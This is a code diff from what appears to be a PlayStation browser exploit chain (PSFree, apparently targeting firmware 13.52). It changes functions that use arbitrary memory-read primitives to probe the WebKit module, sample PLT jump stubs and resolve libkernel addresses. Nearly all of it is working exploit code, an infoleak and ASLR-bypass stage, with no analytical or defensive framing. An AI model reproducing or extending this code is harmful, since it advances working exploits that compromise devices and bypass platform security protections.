@@ -669,27 +669,70 @@ function lkFromFnPtrPsfree(p, fnPtr, off, pltRva, webkitBase) {
     return null;
 }
 
+/** 13.52 poops — pages below +0x10000 are unmapped (same as pivot SCAN_PIVOT_MIN). */
+const POOPS_SCAN_LO = 0x10000;
+
+function isPoopsTextBase(p, webkitBase) {
+    const layout = resolveModuleLayout(p, webkitBase, { quick: true });
+    return !!(layout && (layout.poops || layout.kind === "text"));
+}
+
+/** Mapped .text scan window — poops skips unmapped low pages. */
+function psfreeScanBounds(p, webkitBase, off, opts) {
+    opts = opts || {};
+    const poops = isPoopsTextBase(p, webkitBase);
+    const lo = poops ? POOPS_SCAN_LO : 0x1000;
+    const cap = webkitRvaMaxFromOff(off);
+    let hi = opts.scanEnd != null ? opts.scanEnd : cap;
+    if (hi > cap) hi = cap;
+    if (hi <= lo) hi = Math.min(cap, lo + 0x400000);
+    return { lo, hi, cap, poops };
+}
+
 function fmtMagic4(w) {
     if (w == null) return "null";
     return "0x" + (w >>> 0).toString(16);
 }
 
-/** Quick poops/webkit sanity + low-text PLT density (runs once per PSFree auto). */
-function psfreeProbeBase(p, webkitBase, off, scanEnd) {
+/** ≤20 reads — sanity checkpoints + sparse ff25 sample (no full-range sweep). */
+function psfreeProbeBase(p, webkitBase, off, bounds) {
     const base = moduleLoadBase(p, webkitBase);
-    const magic = read4p(p, base);
-    const cap = Math.min(scanEnd || 0x8000, 0x8000);
+    const expm1 = (off && off.wk_expm1_builtin) || 0;
+    const g5 = 0x13ec77a;
+    const checkpoints = [
+        { rva: 0, tag: "base" },
+        { rva: 0x178, tag: "plt178" },
+        { rva: POOPS_SCAN_LO, tag: "16k" },
+        { rva: expm1, tag: "expm1" },
+        { rva: g5, tag: "g5" },
+    ];
+    const sanity = [];
+    let rdOk = 0;
+    let rdFail = 0;
+    for (let i = 0; i < checkpoints.length; i++) {
+        const cp = checkpoints[i];
+        const w = read4p(p, base.add32(cp.rva));
+        if (w == null) {
+            rdFail++;
+            sanity.push(cp.tag + "=FAIL");
+        } else {
+            rdOk++;
+            sanity.push(cp.tag + "=" + fmtMagic4(w));
+        }
+    }
     let stubs = 0;
-    for (let rva = 0x1000; rva < cap; rva += 4) {
+    const sampleEnd = Math.min(bounds.hi, bounds.lo + 0x10000);
+    for (let rva = bounds.lo; rva < sampleEnd; rva += 0x800) {
         const w0 = read4p(p, base.add32(rva));
-        if (w0 == null) continue;
+        if (w0 == null) { rdFail++; continue; }
+        rdOk++;
         const b0 = w0 & 0xff;
         const b1 = (w0 >>> 8) & 0xff;
         if (b0 === 0xff && (b1 === 0x25 || b1 === 0x15)) stubs++;
     }
     const samples = [];
-    const cands = importPltCandidates(off);
-    for (let i = 0; i < cands.length && i < 6; i++) {
+    const cands = importPltCandidates(off, bounds.lo);
+    for (let i = 0; i < cands.length && i < 4; i++) {
         const rva = cands[i];
         const op = read2p(p, base.add32(rva));
         let tail = op == null ? "rd-fail" : "op=0x" + op.toString(16);
@@ -703,9 +746,14 @@ function psfreeProbeBase(p, webkitBase, off, scanEnd) {
     return {
         wk: String(webkitBase),
         base: String(base),
-        magic: fmtMagic4(magic),
+        poops: bounds.poops,
+        scanLo: bounds.lo,
+        scanHi: bounds.hi,
+        magic: sanity[0] ? sanity[0].split("=")[1] : "?",
+        sanity: sanity.join(" "),
         stubs,
-        cap: "0x" + cap.toString(16),
+        rdOk,
+        rdFail,
         samples: samples.join(" | "),
     };
 }
@@ -720,7 +768,13 @@ function psfreeStatsLine(st) {
         + " lkFail=" + (st.fnLkFails || 0);
     if (st.lastFn) s += " lastFn=" + st.lastFn;
     if (st.lastPlt != null) s += " plt+0x" + st.lastPlt.toString(16);
-    if (st.probe) s += " magic=" + st.probe.magic + " ff25=" + st.probe.stubs;
+    if (st.probe) {
+        s += " poops=" + (st.probe.poops ? 1 : 0);
+        s += " rdOk=" + (st.probe.rdOk || 0) + " rdFail=" + (st.probe.rdFail || 0);
+        s += " ff25sample=" + (st.probe.stubs || 0);
+        s += " scan=0x" + (st.scanLo || (st.probe && st.probe.scanLo) || 0).toString(16)
+            + "..0x" + (st.scanHi || (st.probe && st.probe.scanHi) || 0).toString(16);
+    }
     return s;
 }
 
@@ -760,18 +814,21 @@ function tryOnePsfreePlt(p, webkitBase, off, pltRva) {
 export function tryPsfreePltBatch(p, webkitBase, off, state, opts) {
     opts = opts || {};
     const MAX_READS = opts.maxReads || 32;
-    const scanEnd = opts.scanEnd || 0x28000;
+    const bounds = psfreeScanBounds(p, webkitBase, off, opts);
     let reads = 0;
 
     if (!state) {
-        const probe = psfreeProbeBase(p, webkitBase, off, scanEnd);
+        const probe = psfreeProbeBase(p, webkitBase, off, bounds);
         state = {
             phase: "cand",
             candIdx: 0,
-            cands: importPltCandidates(off),
+            cands: importPltCandidates(off, bounds.lo),
             base: moduleLoadBase(p, webkitBase),
-            cursor: 0x1000,
-            end: scanEnd,
+            cursor: bounds.lo,
+            end: bounds.hi,
+            scanLo: bounds.lo,
+            scanHi: bounds.hi,
+            poops: bounds.poops,
             tried: 0,
             stubsSeen: 0,
             gotNull: 0,
@@ -952,11 +1009,13 @@ const IMPORT_PLT_CANDS = [
     0x1000, 0x1200, 0x1400, 0x1600, 0x2000,
 ];
 
-function importPltCandidates(off) {
+function importPltCandidates(off, scanLo) {
     const out = [];
     const seen = new Set();
+    const minRva = scanLo || 0;
     function add(rva) {
         if (rva == null || rva < 0x100) return;
+        if (rva < minRva) return;
         const k = rva >>> 0;
         if (seen.has(k)) return;
         seen.add(k);
@@ -1817,7 +1876,7 @@ function scanLibkernelStubChunk(p, webkitBase, off, sub, anchors, radius) {
 }
 
 function syntheticTextRanges(off) {
-    return [{ lo: 0x1000, hi: LK_LOW_TEXT_MAX, tag: "tx-low" }];
+    return [{ lo: POOPS_SCAN_LO, hi: LK_LOW_TEXT_MAX, tag: "tx-low" }];
 }
 
 function syntheticRwRanges(off) {
@@ -2147,12 +2206,11 @@ function scanDynamicGotChunk(p, webkitBase, off, state) {
 export function resolveLibkernelPsfree(p, webkitBase, off, opts) {
     opts = opts || {};
     const log = opts.log || (() => {});
-    const cap = iatCap(off);
-
-    const cands = importPltCandidates(off);
+    const bounds = psfreeScanBounds(p, webkitBase, off, opts);
+    const cands = importPltCandidates(off, bounds.lo);
     for (let i = 0; i < cands.length; i++) {
         const pltRva = cands[i];
-        if (pltRva >= cap) continue;
+        if (pltRva >= bounds.hi) continue;
         const hit = tryOnePsfreePlt(p, webkitBase, off, pltRva);
         if (hit && hit.kind === "ok" && hit.lk) {
             log("LK-PSFREE", "plt+0x" + pltRva.toString(16) + " → " + hit.lk
